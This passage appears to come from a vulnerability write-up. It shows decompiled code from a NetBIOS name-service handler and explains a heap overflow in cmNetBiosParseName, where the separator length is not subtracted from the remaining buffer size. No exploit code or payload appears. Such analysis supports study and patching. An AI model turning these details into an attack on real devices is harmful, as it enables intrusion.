&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ndNameProcessExternalMessage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Adapter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;netbios_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r6&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r5&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r4&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nbname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+8h] [bp-28h] BYREF&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;sub_41C47A20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;netcifsnqendapp/IMP/nq/ndnampro.c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x44ED31AC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;178&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x64u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;netbios_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;LOWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vvv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LOBYTE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HIBYTE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmNetBiosParseName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nbname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;netbios_ns_buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xFFu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;//---- [1]&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;//heap overflow at netbios_ns_buffer  &lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getname_query_flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;netbios_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xA800&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ndInternalNamePositiveRegistration&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nbname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xA800&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;switch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xA801&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ndInternalNameNegativeRegistration&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nbname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
   
  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;ndInternalNameNegativeQuery&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nbname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ndExternalNameNegativeQuery&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nbname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;LABEL_17:&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;assset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;netcifsnqendapp/IMP/nq/ndnampro.c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x44ED31AC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;238&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;At &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[1]&lt;/code&gt;, the function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmNetBiosParseName&lt;/code&gt; does not calculate the length of the domain name correctly. It will copy the domain name to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;netbios_ns_buff&lt;/code&gt;, which leads to a heap overflow.&lt;/p&gt;

&lt;p&gt;Let‚Äôs take a look at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmNetBiosParseName&lt;/code&gt; function.&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;cmNetBiosParseName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;netbios_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;netbios_packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;netbios_label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;netbios_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;_BYTE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;domain_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;maxlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r9&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;_BYTE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r1&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r3&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r2&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r3&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;label_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;labellen_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r4&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;labellen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// t1&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v23&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r5&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+4h] [bp-24h] BYREF&lt;/span&gt;

  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;.&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;domain_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;resolveLabel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;netbios_packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;labellen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;label_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;labellen_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;labellen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;maxlen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;labellen&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;memcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;domain_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;label_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;labellen_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;v23&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;domain_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;labellen_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;maxlan&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;labellen_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// ---------- [2]              // it does not subtract the length of &quot;.&quot;&lt;/span&gt;
          &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v23&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
